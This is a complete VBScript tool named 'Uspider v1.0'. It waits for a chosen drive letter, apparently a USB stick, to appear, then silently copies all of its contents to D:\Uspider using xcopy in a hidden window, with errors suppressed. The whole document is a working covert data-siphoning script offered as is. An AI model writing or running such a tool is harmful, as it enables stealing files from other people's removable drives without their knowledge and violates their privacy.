set fso=createObject("scripting.FileSystemObject")
set ws=createObject("wscript.Shell")

a=InputBox("Do Not Be Evil!"+chr(13)+"========================"+chr(13)+"Please enter the drive letter (Letter Only):","Uspider v1.0","H")

If fso.folderExists("D:\Uspider") = false Then
fso.CreateFolder "D:\Uspider"
End If

On Error Resume Next

do
b=a+":\"
If fso.driveExists(b) Then
c="cmd.exe /c xcopy "+b+"* D:\Uspider /e /r /y"
ws.Run(c) ,0
Exit do
End If
wscript.sleep 60000
loop
